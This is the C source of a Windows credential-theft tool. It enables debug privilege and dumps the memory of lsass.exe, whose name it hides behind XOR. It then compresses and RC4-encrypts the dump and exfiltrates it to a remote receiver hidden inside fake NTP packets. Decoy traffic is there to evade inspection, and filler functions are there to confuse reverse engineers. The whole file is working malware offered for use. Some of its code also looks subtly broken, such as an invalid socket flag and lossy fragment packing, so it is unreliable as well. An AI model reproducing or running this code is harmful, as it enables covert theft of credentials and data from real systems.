#define UNICODE
#define _UNICODE

#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <zlib.h>
#include <ws2tcpip.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "DbgHelp.lib")

//
// =======================
//   CONFIGURATION BLOCK
// =======================
//
// Stealth & FEC parameters optimized for ~4 days exfiltration:
// - Only short sleeps (no long pauses) for high throughput.
// - Fragment size, RC4 key, FEC block size, retransmit attempts.
// - Short random delay between packets.
//
#define FRAGMENT_SIZE         16     // Bytes per data fragment
#define RC4_KEY "MySecretKey"        // RC4 key (adjustable)
#define BLOCK_SIZE            10     // Data fragments per FEC block
#define MAX_RETRANS           5      // Max feedback cycles
#define BASE_DELAY_MIN        5      // Min ms between packets
#define BASE_DELAY_MAX       20     // Max ms between packets
#define FEEDBACK_TIMEOUT   3000      // ms to wait for feedback
#define SOCKET_RCVBUF_SIZE (1<<20)   // 1 MiB receive buffer

// Utility macro for minimum
#define MIN(a,b) (((a)<(b))?(a):(b))

//
// =========================
//   GF(256) TABLES FOR RS
// =========================
//
// These tables implement arithmetic in GF(256) for Reed–Solomon FEC.
//
static unsigned char gf_exp[512];
static unsigned char gf_log[256];

//
// =======================
//   GLOBAL STATE
// =======================
//
// A single non-blocking UDP socket for all NTP sends, plus
// two RC4 state arrays (data vs. FEC) to prevent per-packet resets.
//
static SOCKET ntp_sock = INVALID_SOCKET;
static unsigned char S_data[256], S_fec[256];

//
// =======================
//   FUNCTION PROTOTYPES
// =======================
void init_gf(void);
unsigned char gf_mul(unsigned char a, unsigned char b);
void rs_encode_block(const unsigned char *data, int k, unsigned char *parity, int m);
void rc4_init(unsigned char *S, const unsigned char *key, int keylen);
void rc4_crypt(unsigned char *S, const unsigned char *in, unsigned char *out, int len);
BOOL EnableDebugPrivilege(void);
wchar_t* ConvertToWideChar(const char* charStr);
void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen);
DWORD GetTargetProcessPID(const wchar_t *targetProcessName);
BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize);
int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize);
void InitNtpSocket(void);
void InitEncryptionContexts(void);
void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]);
int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]);
int SendDecoyNTPPacket(const char *target_ip, int target_port);
int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize);
void ProcessRetransmissions(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize, int total_fragments);

//
// =======================
//   INITIALIZE GF(256)
// =======================
//
// Build exponent/log tables using the primitive polynomial 0x11d.
//
void init_gf(void) {
    unsigned char x = 1;
    for (int i = 0; i < 255; i++) {
        gf_exp[i] = x;
        gf_log[x] = i;
        x <<= 1;
        if (x & 0x100)
            x ^= 0x11d;
    }
    for (int i = 255; i < 512; i++) {
        gf_exp[i] = gf_exp[i - 255];
    }
}

//
// =======================
//   GF MULTIPLICATION
// =======================
//
// Multiply two bytes in GF(256) via log/exp tables.
//
unsigned char gf_mul(unsigned char a, unsigned char b) {
    if (a == 0 || b == 0) return 0;
    int la = gf_log[a], lb = gf_log[b];
    return gf_exp[(la + lb) % 255];
}

//
// =======================
//   REED–SOLOMON ENCODER
// =======================
//
// Given k data symbols, compute m parity symbols.
//
void rs_encode_block(const unsigned char *data, int k, unsigned char *parity, int m) {
    for (int j = 0; j < m; j++) {
        parity[j] = 0;
        for (int i = 0; i < k; i++) {
            unsigned char coef = gf_exp[(i * (j + 1)) % 255];
            parity[j] ^= gf_mul(data[i], coef);
        }
    }
}

//
// =======================
//   RC4 INITIALIZATION
// =======================
//
// Key-scheduling algorithm (KSA).
//
void rc4_init(unsigned char *S, const unsigned char *key, int keylen) {
    for (int i = 0; i < 256; i++) S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) & 0xFF;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }
}

//
// =======================
//   RC4 ENCRYPTION
// =======================
//
// Pseudo-random generation algorithm (PRGA).
//
void rc4_crypt(unsigned char *S, const unsigned char *in, unsigned char *out, int len) {
    int i = 0, j = 0;
    for (int k = 0; k < len; k++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        unsigned char rnd = S[(S[i] + S[j]) & 0xFF];
        out[k] = in[k] ^ rnd;
    }
}

//
// =========================================
//   ENABLE DEBUG PRIVILEGE (INDIRECT SYSCALLS)
// =========================================
//
// Dynamically load advapi32.dll and lookup token functions.
//
BOOL EnableDebugPrivilege(void) {
    HMODULE hAdv = LoadLibraryW(L"advapi32.dll");
    if (!hAdv) return FALSE;
    typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI *pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
    typedef BOOL (WINAPI *pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
    pOpenProcessToken OpenToken = (pOpenProcessToken)GetProcAddress(hAdv, "OpenProcessToken");
    pLookupPrivilegeValueW LookupValue = (pLookupPrivilegeValueW)GetProcAddress(hAdv, "LookupPrivilegeValueW");
    pAdjustTokenPrivileges AdjustToken = (pAdjustTokenPrivileges)GetProcAddress(hAdv, "AdjustTokenPrivileges");
    if (!OpenToken || !LookupValue || !AdjustToken) { FreeLibrary(hAdv); return FALSE; }
    HANDLE hToken; TOKEN_PRIVILEGES tp; LUID luid;
    if (!OpenToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) { FreeLibrary(hAdv); return FALSE; }
    if (!LookupValue(NULL, SE_DEBUG_NAME, &luid)) { CloseHandle(hToken); FreeLibrary(hAdv); return FALSE; }
    tp.PrivilegeCount=1; tp.Privileges[0].Luid=luid; tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    if (!AdjustToken(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) { CloseHandle(hToken); FreeLibrary(hAdv); return FALSE; }
    CloseHandle(hToken); FreeLibrary(hAdv); return TRUE;
}

//
// =======================
//   UNICODE CONVERSION
// =======================
//
// ANSI → wide conversion for strings.
//
wchar_t* ConvertToWideChar(const char* str) {
    int n = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
    wchar_t *w = malloc(n*sizeof(wchar_t));
    if (w) MultiByteToWideChar(CP_ACP, 0, str, -1, w, n);
    return w;
}

//
// =======================
//   OBFUSCATED STRING DECODE
// =======================
//
// XOR each wchar_t with a key to recover “lsass.exe”.
//
void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
    size_t i=0;
    while(encoded[i] && i<maxLen-1) {
        decoded[i] = encoded[i]^key;
        i++;
    }
    decoded[i]=L'\0';
}

//
// =======================
//   FIND TARGET PID
// =======================
//
// Take a snapshot and walk processes to match name.
//
DWORD GetTargetProcessPID(const wchar_t *name) {
    DWORD pid=0;
    HANDLE hsnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hsnap==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize=sizeof(pe);
    if(Process32FirstW(hsnap,&pe)){
        do {
            if(_wcsicmp(pe.szExeFile,name)==0){
                pid=pe.th32ProcessID; break;
            }
        } while(Process32NextW(hsnap,&pe));
    }
    CloseHandle(hsnap);
    return pid;
}

//
// =======================
//   DUMP PROCESS MEMORY
// =======================
//
// Dynamically load DbgHelp.dll, call MiniDumpWriteDump to a temp file,
// then read it back into memory.
//
BOOL DumpProcessToMemory(DWORD pid, char **dumpBuf, size_t *dumpSize) {
    HMODULE hDbg=LoadLibraryW(L"DbgHelp.dll");
    if(!hDbg) return FALSE;
    typedef BOOL (WINAPI *MiniDumpFn)(HANDLE,DWORD,HANDLE,MINIDUMP_TYPE,
                                      PMINIDUMP_EXCEPTION_INFORMATION,
                                      PMINIDUMP_USER_STREAM_INFORMATION,
                                      PMINIDUMP_CALLBACK_INFORMATION);
    MiniDumpFn pMiniDump=(MiniDumpFn)GetProcAddress(hDbg,"MiniDumpWriteDump");
    if(!pMiniDump){FreeLibrary(hDbg);return FALSE;}
    HANDLE hProc=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
                             FALSE,pid);
    if(!hProc){FreeLibrary(hDbg);return FALSE;}
    char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathA(MAX_PATH,tmpPath);
    sprintf(tmpFile,"%s\\dump_%u.dmp",tmpPath,GetCurrentProcessId());
    HANDLE hf=CreateFileA(tmpFile,GENERIC_READ|GENERIC_WRITE,0,NULL,
                         CREATE_ALWAYS,FILE_ATTRIBUTE_TEMPORARY,NULL);
    if(hf==INVALID_HANDLE_VALUE){
        CloseHandle(hProc);FreeLibrary(hDbg);return FALSE;
    }
    BOOL ok=pMiniDump(hProc,pid,hf,MiniDumpWithFullMemory,
                     NULL,NULL,NULL);
    if(!ok){
        CloseHandle(hf);CloseHandle(hProc);
        FreeLibrary(hDbg);DeleteFileA(tmpFile);
        return FALSE;
    }
    LARGE_INTEGER sz; GetFileSizeEx(hf,&sz);
    *dumpSize=(size_t)sz.QuadPart;
    *dumpBuf=malloc(*dumpSize);
    SetFilePointer(hf,0,NULL,FILE_BEGIN);
    DWORD r; ReadFile(hf,*dumpBuf,(DWORD)*dumpSize,&r,NULL);
    CloseHandle(hf);CloseHandle(hProc);
    FreeLibrary(hDbg);DeleteFileA(tmpFile);
    return (r==(DWORD)*dumpSize);
}

//
// =======================
//   COMPRESS MEMORY DUMP
// =======================
//
// Wrap zlib’s compress() to produce a compressed buffer.
//
int CompressBuffer(const char *inBuf, size_t inSz, char **outBuf, size_t *outSz) {
    uLong bound=compressBound(inSz);
    *outBuf=malloc(bound);
    if(!*outBuf) return Z_MEM_ERROR;
    int res=compress((Bytef*)*outBuf,&bound,(const Bytef*)inBuf,inSz);
    if(res==Z_OK) *outSz=bound;
    else free(*outBuf);
    return res;
}

//
// =======================
//   INIT NTP SOCKET
// =======================
//
// Create one non-blocking UDP socket for all NTP sends.
//
void InitNtpSocket(void) {
    WSADATA w; WSAStartup(MAKEWORD(2,2),&w);
    ntp_sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
    u_long mode=1; ioctlsocket(ntp_sock,FIONIO,&mode);
}

//
// =======================
//   INIT RC4 CONTEXTS
// =======================
//
// Pre-bootstrap two RC4 states to avoid fingerprint.
//
void InitEncryptionContexts(void) {
    rc4_init(S_data,(const unsigned char*)RC4_KEY,strlen(RC4_KEY));
    rc4_init(S_fec,(const unsigned char*)RC4_KEY,strlen(RC4_KEY));
}

//
// =======================
//   CREATE NTP PACKET
// =======================
//
// Build a compliant NTP header with randomized Stratum (2–4),
// Poll (6–10), Precision (−10..−20) and occasional random
// Reference Identifier. Then insert our 8-byte payload.
//
void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
    // 0) LI=0, VN=3, Mode=3
    unsigned char li=0, vn=3, mode=3;
    packet[0] = (li<<6)|(vn<<3)|mode;

    // 1) Randomize Stratum between 2..4
    packet[1] = (unsigned char)(2 + (rand()%3));

    // 2) Randomize Poll between 6..10
    packet[2] = (unsigned char)(6 + (rand()%5));

    // 3) Randomize Precision between −10..−20
    int prec = -(10 + (rand()%11)); // −10..−20
    packet[3] = (unsigned char)(prec & 0xFF);

    // 4) Zero Root Delay + Root Dispersion
    memset(packet+4, 0, 8);

    // 5) Occasionally randomize Reference Identifier (1/10)
    if(rand()%10 == 0) {
        for(int i=0;i<4;i++) packet[12+i] = rand() & 0xFF;
    } else {
        memset(packet+12, 0, 4);
    }

    // 6) Zero out all timestamps before inserting payload
    memset(packet+16, 0, 24);

    // 7) Copy our 8-byte payload into Transmit Timestamp (offset 40)
    memcpy(packet+40, payload, 8);
}

//
// =======================
//   SEND NTP PACKET
// =======================
//
// Non-blocking send, no per-packet WSAStartup.
//
int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);
    unsigned char packet[48];
    CreateNTPPacket(payload, packet);
    return sendto(ntp_sock, (char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
}

//
// =======================
//   SEND DECOY PACKET
// =======================
//
// Random jitter-only NTP packet to break DPI patterns.
//
int SendDecoyNTPPacket(const char *target_ip, int target_port) {
    unsigned char payload[8];
    unsigned int ts = (unsigned int)(time(NULL)+2208988800UL+(rand()%20));
    for(int i=0;i<4;i++) payload[i] = (ts>>(24-8*i))&0xFF;
    unsigned int frac = rand();
    for(int i=0;i<4;i++) payload[4+i] = (frac>>(24-8*i))&0xFF;
    if(SendNTPPacket(target_ip,target_port,payload)==SOCKET_ERROR){
        printf("[!] Failed to send decoy packet.\n");
        return -1;
    }
    return 0;
}

//
// =======================
//   EXFILTRATION CORE
// =======================
//
// 1) Header → fragment count + size
// 2) Shuffle & send each data fragment
// 3) Encrypt via RC4, hide in NTP
// 4) Random decoys
// 5) Short Sleep only
// 6) FEC parity shards
//
int SendCompressedDumpAsNTP(const char *target_ip, int target_port,
                            const char *compressedData, size_t compressedSize) {
    int total_fragments = (int)((compressedSize + FRAGMENT_SIZE - 1) / FRAGMENT_SIZE);

    // -- send header
    unsigned char header[8];
    for(int i=0;i<4;i++) header[i]     = (total_fragments>>(24-8*i))&0xFF;
    for(int i=0;i<4;i++) header[4+i] = ((unsigned int)compressedSize>>(24-8*i))&0xFF;
    SendNTPPacket(target_ip,target_port,header);
    printf("[+] Header sent: %d fragments, %zu bytes.\n", total_fragments,compressedSize);

    // -- shuffle indices
    int *indices = malloc(total_fragments*sizeof(int));
    for(int i=0;i<total_fragments;i++) indices[i]=i;
    for(int i=total_fragments-1;i>0;i--){
        int j=rand()%(i+1);
        int tmp=indices[i]; indices[i]=indices[j]; indices[j]=tmp;
    }

    // -- send data fragments
    for(int k=0;k<total_fragments;k++){
        int seq=indices[k];
        unsigned char payload[8];

        // timestamp
        unsigned int ts=(unsigned int)(time(NULL)+2208988800UL+(rand()%20));
        for(int i=0;i<4;i++) payload[i]=(ts>>(24-8*i))&0xFF;

        // extract fragment
        unsigned char buf[FRAGMENT_SIZE];
        int off=seq*FRAGMENT_SIZE;
        int rem=MIN((int)compressedSize-off,FRAGMENT_SIZE);
        memset(buf,0,FRAGMENT_SIZE);
        if(rem>0) memcpy(buf,compressedData+off,rem);

        // pack into 4B
        uint32_t plain=0;
        for(int b=0;b<FRAGMENT_SIZE;b++)
            plain|=((uint32_t)buf[b])<<(8*(FRAGMENT_SIZE-1-b));
        unsigned char plain_bytes[4]={
            (plain>>24)&0xFF,(plain>>16)&0xFF,
            (plain>>8)&0xFF,plain&0xFF
        };

        // encrypt
        unsigned char cipher[4];
        rc4_crypt(S_data,plain_bytes,cipher,4);
        memcpy(payload+4,cipher,4);

        // send
        SendNTPPacket(target_ip,target_port,payload);

        // random decoy
        if(rand()%5==0) SendDecoyNTPPacket(target_ip,target_port);

        // short sleep
        Sleep((rand()%(BASE_DELAY_MAX-BASE_DELAY_MIN+1))+BASE_DELAY_MIN);
    }
    free(indices);

    // -- send FEC shards
    int block_start=0,block_index=0;
    while(block_start<total_fragments){
        int k_block=MIN(BLOCK_SIZE,total_fragments-block_start);
        unsigned char parity0[BLOCK_SIZE]={0},parity1[BLOCK_SIZE]={0},data_blk[BLOCK_SIZE];

        // pos0
        for(int i=0;i<k_block;i++){
            int idx=block_start+i,off=idx*FRAGMENT_SIZE;
            data_blk[i]=(off<(int)compressedSize)?(unsigned char)compressedData[off]:0;
        }
        rs_encode_block(data_blk,k_block,parity0,k_block);

        // pos1
        for(int i=0;i<k_block;i++){
            int idx=block_start+i,off=idx*FRAGMENT_SIZE+1;
            data_blk[i]=(off<(int)compressedSize)?(unsigned char)compressedData[off]:0;
        }
        rs_encode_block(data_blk,k_block,parity1,k_block);

        // send shards
        for(int j=0;j<k_block;j++){
            unsigned char payload[8];
            unsigned int ts=(unsigned int)(time(NULL)+2208988800UL+(rand()%20));
            for(int i=0;i<4;i++) payload[i]=(ts>>(24-8*i))&0xFF;

            uint32_t fec_seq=0x80000000u|((block_index*BLOCK_SIZE+j)&0x7FFFFFFF);
            uint32_t plain=((fec_seq&0xFFFF)<<16)|((parity0[j]<<8)|parity1[j]);
            unsigned char plain_bytes[4]={
                (plain>>24)&0xFF,(plain>>16)&0xFF,
                (plain>>8)&0xFF,plain&0xFF
            };

            unsigned char cipher[4];
            rc4_crypt(S_fec,plain_bytes,cipher,4);
            memcpy(payload+4,cipher,4);

            SendNTPPacket(target_ip,target_port,payload);
            Sleep((rand()%(BASE_DELAY_MAX-BASE_DELAY_MIN+1))+BASE_DELAY_MIN);
        }

        block_index++;
        block_start+=k_block;
    }

    printf("[+] All data and FEC packets sent.\n");
    return total_fragments;
}

//
// ================================
//   RETRANSMISSION FEEDBACK LOOP
// ================================
//
// Receive a compact feedback packet listing missing IDs, retransmit them.
//
void ProcessRetransmissions(const char *target_ip,int target_port,const char *compressedData,size_t compressedSize,int total_fragments){
    int attempt=0,missingCount=0;
    do{
        SOCKET fb=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
        int buf=SOCKET_RCVBUF_SIZE;
        setsockopt(fb,SOL_SOCKET,SO_RCVBUF,(const char*)&buf,sizeof(buf));

        struct sockaddr_in local={0},sender;
        local.sin_family=AF_INET; local.sin_port=htons(123);
        local.sin_addr.s_addr=INADDR_ANY;
        bind(fb,(struct sockaddr*)&local,sizeof(local));

        int tout=FEEDBACK_TIMEOUT;
        setsockopt(fb,SOL_SOCKET,SO_RCVTIMEO,(const char*)&tout,sizeof(tout));

        char fbBuf[1024];
        int slen=sizeof(sender);
        int len=recvfrom(fb,fbBuf,sizeof(fbBuf),0,(struct sockaddr*)&sender,&slen);
        closesocket(fb);

        if(len>4){
            missingCount=(fbBuf[0]<<24)|(fbBuf[1]<<16)|(fbBuf[2]<<8)|fbBuf[3];
            if(missingCount<=0) break;
            printf("[*] Feedback: %d missing fragments. Retransmitting...\n",missingCount);
            for(int i=0;i<missingCount;i++){
                int off=4+i*4;
                int seq=(fbBuf[off]<<24)|(fbBuf[off+1]<<16)|(fbBuf[off+2]<<8)|fbBuf[off+3];
                unsigned char payload[8];
                unsigned int ts=(unsigned int)(time(NULL)+2208988800UL+(rand()%20));
                for(int b=0;b<4;b++) payload[b]=(ts>>(24-8*b))&0xFF;
                unsigned char buf2[FRAGMENT_SIZE]={0};
                int data_off=seq*FRAGMENT_SIZE;
                int rem=MIN((int)compressedSize-data_off,FRAGMENT_SIZE);
                if(rem>0) memcpy(buf2,compressedData+data_off,rem);
                uint32_t plain=0;
                for(int b=0;b<FRAGMENT_SIZE;b++)
                    plain|=((uint32_t)buf2[b])<<(8*(FRAGMENT_SIZE-1-b));
                unsigned char plain_bytes[4]={
                    (plain>>24)&0xFF,(plain>>16)&0xFF,
                    (plain>>8)&0xFF,plain&0xFF
                };
                unsigned char cipher[4];
                rc4_crypt(S_data,plain_bytes,cipher,4);
                memcpy(payload+4,cipher,4);
                SendNTPPacket(target_ip,target_port,payload);
                printf("[+] Retransmitted fragment %d\n",seq);
                Sleep((rand()%(BASE_DELAY_MAX-BASE_DELAY_MIN+1))+BASE_DELAY_MIN);
            }
        } else {
            missingCount=0;
        }
        attempt++;
    } while(missingCount>0 && attempt<MAX_RETRANS);

    if(missingCount>0) printf("[!] %d fragments still missing.\n",missingCount);
    else printf("[+] All missing fragments retransmitted.\n");
}

//
// =======================
//   MAIN ENTRYPOINT
// =======================
//
// Orchestrate privilege, dump, compress, exfiltrate, retransmit.
//
int main(void){
    srand((unsigned int)time(NULL));

    // build GF tables
    init_gf();

    // enable debug privilege
    if(!EnableDebugPrivilege()){
        printf("[!] Unable to enable SeDebugPrivilege.\n");
        return 1;
    }

    // init networking & crypto
    InitNtpSocket();
    InitEncryptionContexts();

    // decode obfuscated "lsass.exe"
    wchar_t encodedTarget[]={ 'l'^0x13,'s'^0x13,'a'^0x13,'s'^0x13,'s'^0x13,'.'^0x13,'e'^0x13,'x'^0x13,'e'^0x13,L'\0'};
    wchar_t targetName[256];
    DecodeString(encodedTarget,0x13,targetName,256);
    wprintf(L"[*] Target process: %s\n",targetName);

    // get receiver
    char target_ip[64]; int target_port;
    printf("[*] Receiver IP: ");
    if(scanf("%63s",target_ip)!=1) return 1;
    printf("[*] Receiver port: ");
    if(scanf("%d",&target_port)!=1) return 1;

    // find PID
    DWORD pid=GetTargetProcessPID(targetName);
    if(!pid){printf("[!] Process not found.\n");return 1;}
    wprintf(L"[+] Found PID %lu\n",pid);

    // dump memory
    char *dumpBuf=NULL; size_t dumpSz=0;
    if(!DumpProcessToMemory(pid,&dumpBuf,&dumpSz)){
        printf("[!] Dump failed.\n"); return 1;}
    printf("[+] Dumped %zu bytes\n",dumpSz);

    // compress
    char *compBuf=NULL; size_t compSz=0;
    int cres=CompressBuffer(dumpBuf,dumpSz,&compBuf,&compSz);
    free(dumpBuf);
    if(cres!=Z_OK){printf("[!] Compress error %d\n",cres);return 1;}
    printf("[+] Compressed to %zu bytes\n",compSz);

    // exfiltrate
    int total=SendCompressedDumpAsNTP(target_ip,target_port,compBuf,compSz);
    if(total<0){printf("[!] Send error\n");free(compBuf);return 1;}
    printf("[+] Sent %d fragments\n",total);

    // retransmit missing
    ProcessRetransmissions(target_ip,target_port,compBuf,compSz,total);

    free(compBuf);
    printf("[+] Done.\n");
    return 0;
}

//
// =======================
//   DUMMY/NOP FUNCTIONS
// =======================
//
// Bloat & confuse reverse engineers.
//
static void NoOp1(void){ __asm__ __volatile__("nop"); }
static void NoOp2(void){ }
int PhantomLogic(int p,int q){int r=p*q; if(r<0)r=-r; return (r^0xABCDEF)&0xFF;}
char* DummyBufferAlloc(void){return (char*)malloc(128);}
void DummyBufferFree(char*p){free(p);}
int Compute42(int a){return (a*42)^0x1234;}
void JunkFunction1(void){volatile int x=0; for(int i=0;i<100;i++) x+=i;}
double UselessCalc(double x){double y=x*3.14159; return y-(int)y;}
void FillDummy(char*buf,size_t n){ for(size_t i=0;i<n;i++) buf[i]=(char)(i&0xFF); }

#ifdef __cplusplus
class Empty{public:Empty(){} void doNothing() const{} ~Empty(){}};
class Confuser{int v;public:Confuser():v(0){} void confuse(){v^=0xDEAD;} int get()const{return v;} ~Confuser(){}};
class Obscure{double d;public:Obscure(double d_=0):d(d_){} double get()const{return d;} void set(double d_){d=d_;} ~Obscure(){}};
class Noise{char b[32];public:Noise(){memset(b,0,32);} void randomize(){for(int i=0;i<32;i++)b[i]=rand()&0xFF;} ~Noise(){}};
#endif

static int UnusedTable[16]={
    0xDEADBEEF,0xCAFEBABE,0x8BADF00D,0xFEEDFACE,
    0xBAADF00D,0x0D15EA5E,0xFACEFEED,0x12345678,
    0x87654321,0x0BADCAFE,0xF00DBABE,0xB16B00B5,
    0x0DEFACED,0xC001D00D,0xDEFEC8ED,0xBA5EBA11
};
static void UseUnusedTable(void){ for(int i=0;i<16;i++) UnusedTable[i]++; }
